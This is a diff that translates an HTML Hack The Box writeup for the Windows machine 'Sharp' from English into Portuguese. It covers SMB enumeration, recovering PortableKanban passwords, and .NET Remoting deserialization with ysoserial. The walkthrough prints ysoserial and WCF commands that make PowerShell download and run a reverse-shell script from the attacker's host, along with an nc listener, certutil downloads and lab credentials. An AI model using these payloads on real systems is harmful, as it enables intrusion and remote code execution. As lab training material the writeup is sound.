@@ -1,33 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>sharp — htb writeup · chu@antisec</title>
-    <meta name="description" content="htb sharp writeup (windows): smb + portable kanban with encrypted passwords, a .net remoting debug endpoint and ysoserial typeconfusedelegate all the way to a dll on wcf.">
+    <title>sharp — writeup htb · chu@antisec</title>
+    <meta name="description" content="writeup htb sharp (windows): smb + portable kanban com senhas criptografadas, endpoint de debug .net remoting e ysoserial typeconfusedelegate até dll no wcf. em português.">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="../styles.css">
-    <link rel="alternate" hreflang="pt-BR" href="../pt/hackthebox/sharp.html">
-    <link rel="alternate" hreflang="en" href="sharp.html">
-    <link rel="alternate" hreflang="x-default" href="sharp.html">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="pt-BR" href="sharp.html">
+    <link rel="alternate" hreflang="en" href="../../hackthebox/sharp.html">
+    <link rel="alternate" hreflang="x-default" href="../../hackthebox/sharp.html">
   </head>
   <body>
-    <a class="skip" href="#main">skip to content</a>
+    <a class="skip" href="#main">pular para o conteúdo</a>
 
     <header class="chrome">
       <div class="wrap chrome-in">
-        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
-        <nav class="nav" aria-label="main">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/htb$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
           <ul>
-            <li><a href="../index.html">home</a></li>
-            <li><a href="../research/index.html">research</a></li>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="../index.html">pesquisa</a></li>
             <li><a href="index.html" aria-current="page">writeups</a></li>
-            <li><a href="../about.html">about</a></li>
-            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
-            <li class="lang"><a href="../pt/hackthebox/sharp.html" hreflang="pt-BR" lang="pt-BR" title="versão em português" aria-label="mudar para português"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></a><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></span></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../hackthebox/sharp.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
           </ul>
         </nav>
       </div>
@@ -44,17 +44,17 @@
         <ul class="meta">
           <li class="chip">date=2026-04-17</li>
           <li class="chip">os=windows</li>
-          <li class="chip">lang=en</li>
+          <li class="chip">lang=pt-br</li>
           <li class="chip chip--phos">status=root</li>
         </ul>
 
         <figure class="fig">
           <a href="https://i.imgur.com/b8fWlNj.png"><img src="https://i.imgur.com/b8fWlNj.png" alt="Sharp" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>sharp</b> — machine card on hackthebox</figcaption>
+          <figcaption class="fig-cap"><b>sharp</b> — card da máquina no hackthebox</figcaption>
         </figure>
 
         <p class="cmd"><span class="ps1"><b>chu@antisec</b>:~/htb$</span> cat tools.txt</p>
-        <p><strong>Tools</strong> used:</p>
+        <p><strong>Tools</strong> utilizadas:</p>
         <ul class="chips">
           <li class="chip">nmap</li>
           <li class="chip">smbclient</li>
@@ -103,10 +103,10 @@ HOP RTT       ADDRESS
 
         <figure class="fig">
           <a href="https://i.imgur.com/Fvm7tk6.png"><img src="https://i.imgur.com/Fvm7tk6.png" alt="Image" loading="lazy"></a>
-          <figcaption class="fig-cap"><b>smbclient</b> — listing the shares</figcaption>
+          <figcaption class="fig-cap"><b>smbclient</b> — listando os compartilhamentos</figcaption>
         </figure>
 
-        <p>Let's head to the kanban directory</p>
+        <p>Vamos ao diretório kanban</p>
 
         <div class="code">
           <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
@@ -115,28 +115,28 @@ HOP RTT       ADDRESS
 
       <figure class="fig">
         <a href="https://i.imgur.com/yIbnT0B.png"><img src="https://i.imgur.com/yIbnT0B.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>kanban</b> — share contents</figcaption>
+        <figcaption class="fig-cap"><b>kanban</b> — conteúdo do compartilhamento</figcaption>
       </figure>
 
-      <p>We can see a file called PortableKanban.pk3.bak that looks like a backup file, so let's read it</p>
+      <p>Podemos ver um arquivo chamado PortableKanban.pk3.bak que apararente ser um arquivo de backup, então vamos lê-lo</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/wWij6x7.png"><img src="https://i.imgur.com/wWij6x7.png" alt="Image" loading="lazy"></a>
         <figcaption class="fig-cap"><b>backup</b> — PortableKanban.pk3.bak</figcaption>
       </figure>
 
-      <p>Opening it, we can see the file holds encrypted passwords:</p>
+      <p>Ao abri-lo, podemos ver que, dentro do arquivo existem senhas criptografadas:</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/m4DVEag.png"><img src="https://i.imgur.com/m4DVEag.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>pk3</b> — encrypted passwords in the file</figcaption>
+        <figcaption class="fig-cap"><b>pk3</b> — senhas criptografadas no arquivo</figcaption>
       </figure>
 
-      <p>We start by hitting the SMB service to copy the program over to our machine:</p>
+      <p>Começamos acessando o serviço SMB para copiar o programa para nossa maquina:</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/Wkz1IMK.png"><img src="https://i.imgur.com/Wkz1IMK.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>smb</b> — copying the program</figcaption>
+        <figcaption class="fig-cap"><b>smb</b> — copiando o programa</figcaption>
       </figure>
 
       <div class="code">
@@ -145,59 +145,59 @@ HOP RTT       ADDRESS
 get pkb.zip</code></pre>
       </div>
 
-      <p>For this box, for the first time I had to spin up a Windows machine to use as the attacker...
-        We extract the files from our pkb.zip archive</p>
+      <p>Essa máquina, pela primeira vez tive que criar uma máquina Windows para usar como atacante...
+        Extraímos os arquivos do nosso arquivo pkb.zip</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/u7nyOBw.png"><img src="https://i.imgur.com/u7nyOBw.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>pkb.zip</b> — files extracted</figcaption>
+        <figcaption class="fig-cap"><b>pkb.zip</b> — arquivos extraídos</figcaption>
       </figure>
 
-      <p>Running PortableKanban.exe we can see it creates the PortableKanban.pk3.bak file where it stores the credentials...
-        So let's swap in the PortableKanban.pk3.bak file we found on our target.</p>
+      <p>Ao executarmos o arquivo PortableKanban.exe podemos perceber que ele faz a criação do arquivo PortableKanban.pk3.bak onde ele guarda as credenciais...
+        Então vamos substituir pelo arquivo PortableKanban.pk3.bak que encontramos em nosso alvo.</p>
 
-      <p>After swapping the PortableKanban.pk3 file, we need credentials to get into the program.</p>
+      <p>Ao substituir o arquivo PortableKanban.pk3, precisamos de credenciais para conseguir acessar o programa.</p>
 
       <figure class="fig">
         <a href="https://i.imgur.com/q1UFNLT.png"><img src="https://i.imgur.com/q1UFNLT.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>login</b> — asking for credentials</figcaption>
+        <figcaption class="fig-cap"><b>login</b> — pedindo credenciais</figcaption>
       </figure>
 
       <figure class="fig">
         <a href="https://i.imgur.com/GSP4UQv.png"><img src="https://i.imgur.com/GSP4UQv.png" alt="Image" loading="lazy"></a>
-        <figcaption class="fig-cap"><b>portable kanban</b> — program screen</figcaption>
+        <figcaption class="fig-cap"><b>portable kanban</b> — tela do programa</figcaption>
       </figure>
 
-      <p>Digging a bit more into Kanban, I noticed the program itself can return the passwords in plain-text with an Administrator account...
-        In our file we have this info:</p>
+      <p>Pesquisando um pouco mais sobre o Kanban, pude perceber que dentro do programa é possivel retornar as senhas em plain-text com uma conta de Administrador...
+        Em nosso arquivo temos essas informações:</p>
 
       <div class="code">
-        <div class="code-cap"><span class="dot">●</span> <span>users</span></div>
+        <div class="code-cap"><span class="dot">●</span> <span>usuarios</span></div>
         <pre><code>{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731}
 {"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}</code></pre>
       </div>
 
-      <p>So we have an admin user and a regular user.
-        What we can do is try editing the file that stores the passwords to get in
-        First, we remove the password of user lars to get the Administrator user's password, for that we leave the 'EncryptedPassword' field empty, and on top of that we change the 'Role' part from user to Admin.</p>
+      <p>Portanto, temos um usuário administrador e um user comum.
+        O que podemos fazer é tentar editar o arquivo que guarda as senhas para acessar
+        Primeiro, vamos remover a senha do usuário lars para conseguir a senha do usuário Administrator, para isso deixaremos o campo 'EncryptedPassword' vazio, além disso, mudaremos a parte 'Role' de user para Admin.</p>
 
       <div class="code">
         <div class="code-cap"><span class="dot">●</span> <span>edit</span></div>
         <pre><code>{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"","Role":"Admin","Inactive":false,"TimeStamp":637409769265925613}</code></pre>
     </div>
 
-    <p>After that, we try to log into the program as user 'lars' with no password.</p>
+    <p>Após isso, tentamos acessar o programa com usuário 'lars' sem senha.</p>
 
     <figure class="fig">
       <a href="https://i.imgur.com/Af60F1P.png"><img src="https://i.imgur.com/Af60F1P.png" alt="Image" loading="lazy"></a>
-      <figcaption class="fig-cap"><b>lars</b> — login with no password</figcaption>
+      <figcaption class="fig-cap"><b>lars</b> — login sem senha</figcaption>
     </figure>
 
-    <p>Unchecking the Hide Passwords option, we get our first credentials:</p>
+    <p>Ao desmarcar a opção Hide Passwords, temos nossas primeiras credenciais:</p>
 
     <figure class="fig">
       <a href="https://i.imgur.com/fk984oq.png"><img src="https://i.imgur.com/fk984oq.png" alt="Image" loading="lazy"></a>
-      <figcaption class="fig-cap"><b>hide passwords</b> — passwords in plain-text</figcaption>
+      <figcaption class="fig-cap"><b>hide passwords</b> — senhas em plain-text</figcaption>
     </figure>
 
     <div class="code">
@@ -205,14 +205,14 @@ get pkb.zip</code></pre>
       <pre><code>Administrator:G2@$btRSHJYTarg</code></pre>
   </div>
 
-  <p>With that, we can go back to our original PortableKanban.pk3 file.
-    Now when we open the Kanban, we use the Administrator credentials.</p>
+  <p>Com isso, podemos voltar para nosso arquivo PortableKanban.pk3 inicial.
+    Agora ao abrirmos o Kanban, usamos as credenciais de Administrator.</p>
 
-  <p>Now we have credentials for user lars and for user Administrator:</p>
+  <p>Agora temos credenciais do usuário lars e do usuário Administrator:</p>
 
   <figure class="fig">
     <a href="https://i.imgur.com/tlGO5us.png"><img src="https://i.imgur.com/tlGO5us.png" alt="Image" loading="lazy"></a>
-    <figcaption class="fig-cap"><b>credentials</b> — lars and administrator</figcaption>
+    <figcaption class="fig-cap"><b>credenciais</b> — lars e administrator</figcaption>
   </figure>
 
   <div class="code">
@@ -220,11 +220,11 @@ get pkb.zip</code></pre>
     <pre><code>lars:G123HHrth234gRG</code></pre>
 </div>
 
-<p>On the other SMB directory, called dev:</p>
+<p>No outro diretório do SMB, chamado dev:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Er6JZCu.png"><img src="https://i.imgur.com/Er6JZCu.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>dev</b> — dev share with lars</figcaption>
+  <figcaption class="fig-cap"><b>dev</b> — compartilhamento dev com lars</figcaption>
 </figure>
 
 <div class="code">
@@ -232,17 +232,17 @@ get pkb.zip</code></pre>
   <pre><code>smbclient \\10.10.10.219\dev -U lars</code></pre>
 </div>
 
-<p>We download all these files to our machine so we can analyze them.</p>
+<p>Fazemos o download de todos esses arquivos para a nossa máquina para podermos analisarmos.</p>
 
-<p>We use dnSpy to analyze the .exe files
-  Inside Client.exe, there's an interesting piece of info:</p>
+<p>Usamos o dnSpy para analisar os arquivos .exe
+  Dentro do arquivo Client.exe, temos uma informação interessante:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/gUNQ87R.png"><img src="https://i.imgur.com/gUNQ87R.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>dnspy</b> — debug credential in Client.exe</figcaption>
+  <figcaption class="fig-cap"><b>dnspy</b> — credencial de debug no Client.exe</figcaption>
 </figure>
 
-<p>We have a credential and an address:</p>
+<p>Temos uma credencial e um endereço:</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>debug</span></div>
@@ -250,23 +250,23 @@ get pkb.zip</code></pre>
 tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
 </div>
 
-<p>Looking into how to talk to this service, we found an exploit that interacts with it through Remoting.Channels.Tcp, the <a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a>.</p>
+<p>Pesquisando sobre como interagir com esse serviço, encontramos um exploit que interage com esse serviço através do Remoting.Channels.Tcp, o <a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a>.</p>
 
-<p>We can compile it on our machine, or just download it already <a href="https://github.com/parteeksingh005/ExploitRemotingService_Compiled">compiled</a>.</p>
+<p>Podemos compilar ele em nossa máquina, ou já fazer o download dele <a href="https://github.com/parteeksingh005/ExploitRemotingService_Compiled">compilado</a>.</p>
 
-<p>Now we need to prepare the payload we'll send through ExploitRemotingService.
-  For that we'll need python and also <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a>.</p>
+<p>Agora precisamos preparar nosso payload que enviaremos atraves do ExploitRemotingService.
+  Para isso vamos precisar do python e também do <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a>.</p>
 
-<p>We have to compile ysoserial or download it already <a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34">compiled</a>.</p>
+<p>Devemos compilar o ysoserial ou baixa-lo já <a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34">compilado</a>.</p>
 
-<p>After that, we need to get our shell ready.
-  We'll use this <a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1">shell.ps1</a></p>
+<p>Após isso, devemos preparar nossa shell.
+  Usaremos está <a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1">shell.ps1</a></p>
 
-<p>Let's use ysoserial to craft our payload:</p>
+<p>Vamos usar o ysoserial para criar nosso payload:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/UEtxowu.png"><img src="https://i.imgur.com/UEtxowu.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ysoserial</b> — generating the payload</figcaption>
+  <figcaption class="fig-cap"><b>ysoserial</b> — gerando o payload</figcaption>
 </figure>
 
 <div class="code">
@@ -274,11 +274,11 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
   <pre><code>.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('10.10.14.136/chu.ps1')"</code></pre>
 </div>
 
-<p>With ExploitRemotingService we send our payload over:</p>
+<p>Com o ExploitRemotingService enviaremos o nosso payload:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/rcn6eSy.png"><img src="https://i.imgur.com/rcn6eSy.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>exploit</b> — payload sent</figcaption>
+  <figcaption class="fig-cap"><b>exploit</b> — payload enviado</figcaption>
 </figure>
 
 <div class="code">
@@ -286,11 +286,11 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
   <pre><code>.\ExploitRemotingService.exe --user=debug --pass=SharpApplicationDebugUserPassword123! tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw +PAYLOAD</code></pre>
 </div>
 
-<p>After sending the payload, we start our python server and open a port on our machine to receive the shell connection.</p>
+<p>Ao enviar o payload, devemos ativar nosso servidor python e abrir uma porta em nossa máquina para receber a conexão de nossa shell.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/hCp7bvX.png"><img src="https://i.imgur.com/hCp7bvX.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>python</b> — file server up</figcaption>
+  <figcaption class="fig-cap"><b>python</b> — servidor de arquivos no ar</figcaption>
 </figure>
 
 <div class="code">
@@ -300,7 +300,7 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
 
 <figure class="fig">
   <a href="https://i.imgur.com/y3AYsaE.png"><img src="https://i.imgur.com/y3AYsaE.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>nc</b> — listening for the reverse connection</figcaption>
+  <figcaption class="fig-cap"><b>nc</b> — escutando a conexão reversa</figcaption>
 </figure>
 
 <div class="code">
@@ -308,13 +308,13 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
   <pre><code>nc -vvnlp 1337</code></pre>
 </div>
 
-<p>We have our initial shell :)</p>
+<p>Temos nossa shell inicial :)</p>
 
-<p>To escalate our privileges, we'll run 'winpeas.exe', so we have to send it first, let's generate our payload in ysoserial:</p>
+<p>Para escalar nossos privilégios, vamos executar o 'winpeas.exe', portanto, devemos envia-lo primeiro, vamos gerar nosso payload no ysoserial:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/P7Mwi7Y.png"><img src="https://i.imgur.com/P7Mwi7Y.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>ysoserial</b> — payload for winpeas</figcaption>
+  <figcaption class="fig-cap"><b>ysoserial</b> — payload pro winpeas</figcaption>
 </figure>
 
 <div class="code">
@@ -322,11 +322,11 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
   <pre><code>.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.128/winpeas.exe')"</code></pre>
 </div>
 
-<p>Getting into C:\users\lars\Documents\ we come across a folder called wcf, let's compress it and move it to the SMB shared directory.</p>
+<p>Ao acessar a pasta C:\users\lars\Documents\ nos deparamos com uma pasta chamada wcf, vamos compacta-la e move-la para o diretório compartilhado do SMB.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/hgqNEMp.png"><img src="https://i.imgur.com/hgqNEMp.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>wcf</b> — folder found</figcaption>
+  <figcaption class="fig-cap"><b>wcf</b> — pasta encontrada</figcaption>
 </figure>
 
 <div class="code">
@@ -335,11 +335,11 @@ tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code></pre>
 move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</code></pre>
 </div>
 
-<p>After compressing and moving it to the shared folder on SMB, we access it with the credentials we already have and download it to our machine:</p>
+<p>Após compactar e mover para pasta compartilhada no SMB, acessamos com credenciais já obtidas e baixamos para nossa máquina:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/4QTDFQ5.png"><img src="https://i.imgur.com/4QTDFQ5.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>smb</b> — wcf.zip on the share</figcaption>
+  <figcaption class="fig-cap"><b>smb</b> — wcf.zip no compartilhamento</figcaption>
 </figure>
 
 <div class="code">
@@ -349,21 +349,21 @@ move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</code></pre>
 
 <figure class="fig">
   <a href="https://i.imgur.com/znyZr6A.png"><img src="https://i.imgur.com/znyZr6A.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>download</b> — pulling down wcf.zip</figcaption>
+  <figcaption class="fig-cap"><b>download</b> — baixando o wcf.zip</figcaption>
 </figure>
 
-<p>With the file downloaded to our machine, we can open it in VisualStudio:</p>
+<p>Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/yEePAM8.png"><img src="https://i.imgur.com/yEePAM8.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>visual studio</b> — project open</figcaption>
+  <figcaption class="fig-cap"><b>visual studio</b> — projeto aberto</figcaption>
 </figure>
 
-<p>We add our line to the code and then build.</p>
+<p>Vamos adicionar nossa linha no código e depois compilar.</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/Z1YUP68.png"><img src="https://i.imgur.com/Z1YUP68.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>build</b> — line added to the code</figcaption>
+  <figcaption class="fig-cap"><b>build</b> — linha adicionada ao código</figcaption>
 </figure>
 
 <div class="code">
@@ -371,11 +371,11 @@ move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</code></pre>
   <pre><code>Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.219/chu.ps1')"));</code></pre>
 </div>
 
-<p>We transfer the files to the machine(we could have used Invoke-WebRequest):</p>
+<p>Transferimos os arquivos para a máquina(poderiamos ter usado o Invoke-WebRequest):</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/zLgjJS9.png"><img src="https://i.imgur.com/zLgjJS9.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>transfer</b> — dll and client on the machine</figcaption>
+  <figcaption class="fig-cap"><b>transfer</b> — dll e cliente na máquina</figcaption>
 </figure>
 
 <div class="code">
@@ -384,18 +384,18 @@ move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</code></pre>
 certutil -urlcache -split -f "http://10.10.14.219/WcfClient.exe" WcfClient.exe</code></pre>
 </div>
 
-<p>After that, we run our file:</p>
+<p>Após isso, executamos nosso arquivo:</p>
 
 <div class="code">
   <div class="code-cap"><span class="dot">●</span> <span>cmd</span></div>
   <pre><code>.\WcfClient.exe</code></pre>
 </div>
 
-<p>With that, we get the connection back as r00t~</p>
+<p>Com isso, recebemos a conexão como r00t~</p>
 
 <figure class="fig">
   <a href="https://i.imgur.com/HMjn5Uw.png"><img src="https://i.imgur.com/HMjn5Uw.png" alt="Image" loading="lazy"></a>
-  <figcaption class="fig-cap"><b>root</b> — shell as system</figcaption>
+  <figcaption class="fig-cap"><b>root</b> — shell de system</figcaption>
 </figure>
 
 <div class="code">
@@ -432,10 +432,10 @@ certutil -urlcache -split -f "http://10.10.14.219/WcfClient.exe" WcfClient.exe</
       <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
     </div>
     <div class="foot-row">
-      <p>© 2026 chu · <a href="../index.html">home</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contact</a></p>
+      <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="index.html">writeups</a> · <a href="../about.html#contact">contato</a></p>
     </div>
   </div>
 </footer>
-<script src="../zoom.js" defer></script>
+<script src="../../zoom.js" defer></script>
 </body>
 </html>
